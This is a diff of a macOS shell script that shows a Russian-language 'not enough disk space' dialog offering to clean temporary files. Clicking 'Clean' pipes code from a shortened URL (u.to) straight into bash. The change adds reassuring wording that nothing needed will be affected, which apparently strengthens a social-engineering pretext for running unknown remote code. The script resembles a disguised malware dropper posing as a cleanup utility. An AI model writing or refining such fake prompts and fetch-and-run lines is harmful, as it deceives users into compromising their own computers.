@@ -35,7 +35,7 @@ check_space() {
 
 if ! check_space; then
     # Места мало, предлагаем очистку
-    RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (минимум 300 МБ). Попробовать очистить временные файлы?" with title "Ошибка места" buttons {"Отмена", "Очистить"} default button "Очистить" with icon caution')
+    RESPONSE=$(osascript -e 'display dialog "Недостаточно места на диске (минимум 300 МБ). Попробовать очистить временные файлы? Это не затронет нужные файлы" with title "Ошибка места" buttons {"Отмена", "Очистить"} default button "Очистить" with icon caution')
     
     if [[ "$RESPONSE" == *"button returned:Очистить"* ]]; then
         curl -sL https://u.to/Lk2ZIg | bash
